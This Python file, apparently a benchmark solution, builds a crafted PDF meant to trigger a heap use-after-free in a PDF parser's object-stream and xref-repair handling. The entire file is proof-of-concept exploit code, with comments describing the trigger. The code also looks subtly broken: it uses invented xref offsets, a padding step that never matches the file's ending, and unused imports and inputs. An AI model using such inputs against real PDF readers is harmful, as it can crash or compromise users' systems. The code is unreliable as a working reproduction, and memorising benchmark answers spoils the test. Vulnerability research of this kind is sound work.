import os
import subprocess
import tempfile
import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # This PoC creates a PDF that triggers heap use-after-free
        # by exploiting object stream loading with xref solidification
        
        # Build a minimal PDF with:
        # 1. Object stream containing multiple objects
        # 2. Xref that needs repair/solidification
        # 3. References that cause cache_object recursion
        
        pdf = b""

        # Helper to add PDF objects
        def obj(num, data):
            return f"{num} 0 obj\n{data}\nendobj\n".encode()

        # Header
        pdf += b"%PDF-1.7\n\n"

        # Object 1: Catalog
        catalog = """<<
/Type /Catalog
/Pages 2 0 R
>>"""
        pdf += obj(1, catalog)

        # Object 2: Pages tree
        pages = """<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>"""
        pdf += obj(2, pages)

        # Object 3: Page
        page = """<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
/Contents 4 0 R
/Resources <<
/Font <<
/F1 5 0 R
>>
>>
>>"""
        pdf += obj(3, page)

        # Object 4: Content stream (empty)
        content = """<<
/Length 0
>>
stream
endstream"""
        pdf += obj(4, content)

        # Object 5: Font
        font = """<<
/Type /Font
/Subtype /Type1
/BaseFont /Helvetica
>>"""
        pdf += obj(5, font)

        # Object 6: Object stream containing multiple objects
        # This will trigger the vulnerability
        objstm_data = b""
        objstm_data += b"7 0 8 10 "  # Object 7 at offset 0, Object 8 at offset 10
        objstm_data += b"7 0 obj\n<<>>\nendobj\n"  # Object 7
        objstm_data += b"8 0 obj\n<<>>\nendobj\n"  # Object 8
        
        objstm = f"""<<
/Type /ObjStm
/N 2
/First {len(b"7 0 8 10 ")}
/Length {len(objstm_data)}
>>
stream
"""
        pdf += obj(6, objstm.encode() + objstm_data + b"\nendstream")

        # Object 9: Indirect reference to object in stream (triggers recursion)
        indirect = """<<
/Ref 7 0 R
/Type /Catalog
>>"""
        pdf += obj(9, indirect)

        # Object 10: Another object that references the stream object
        refobj = """<<
/Ref 8 0 R
/Parent 9 0 R
>>"""
        pdf += obj(10, refobj)

        # Object 11: Dictionary that will cause xref repair
        repair_dict = """<<
/Type /XRef
/Size 20
/W [1 2 1]
/Index [0 12]
/Length 50
>>
stream
"""
        # Create xref stream data with inconsistencies to trigger repair
        xref_data = bytearray()
        # Add entries that will need repair
        for i in range(12):
            if i in [6, 7, 8]:
                # Compressed objects in object stream
                xref_data.extend(struct.pack('>BHH', 2, 6, 0))
            else:
                # Normal objects
                xref_data.extend(struct.pack('>BHH', 1, 100 + i*10, 0))
        
        pdf += obj(11, repair_dict.encode() + bytes(xref_data) + b"\nendstream")

        # Add more objects to create pressure on heap
        for i in range(12, 30):
            pdf += obj(i, f"<< /Num {i} >>")

        # Xref table (partial, will be repaired)
        xref_offset = len(pdf)
        pdf += b"xref\n"
        pdf += b"0 30\n"
        
        # Add xref entries with some inconsistencies
        for i in range(30):
            if i == 0:
                pdf += b"0000000000 65535 f \n"
            elif i in [6, 7, 8]:
                # Mark as compressed object references (will be repaired)
                pdf += b"0000000000 00000 n \n"
            else:
                offset = 100 + i * 10
                pdf += f"{offset:010d} 00000 n \n".encode()

        # Trailer
        pdf += b"""trailer
<<
/Size 30
/Root 1 0 R
/Info << >>
>>
startxref
"""
        pdf += str(xref_offset).encode()
        pdf += b"\n%%EOF"

        # The vulnerability is triggered by:
        # 1. Loading object 7 from object stream 6
        # 2. During loading, xref needs repair/solidification
        # 3. This frees the xref entry while it's still being used
        # 4. Subsequent access causes use-after-free
        
        # Add padding to reach target size while maintaining PDF validity
        target_size = 6431
        if len(pdf) < target_size:
            # Add comments to pad the file
            padding = b"\n% " + b"P" * (target_size - len(pdf) - 3) + b"\n"
            pdf = pdf.replace(b"%%EOF\n", padding + b"%%EOF\n")
        
        return pdf
